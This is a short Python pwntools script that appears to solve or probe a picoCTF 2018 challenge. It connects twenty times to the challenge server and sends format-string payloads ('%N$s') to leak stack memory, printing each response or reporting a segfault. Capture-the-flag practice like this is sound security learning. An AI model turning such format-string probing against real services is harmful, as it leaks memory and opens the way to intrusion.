#!/usr/bin/env python

from pwn import *

host, port = '2018shell.picoctf.com', 23397



for i in range(20):
    s = remote(host, port)

    s.recvuntil('> ')

    s.sendline('%' + str(i) + '$s')
    #s.sendline('%2$s')

    response = s.recv()
    if('dumped core' in response):
        print 'segfault'
    else:
        print response

    s.close()

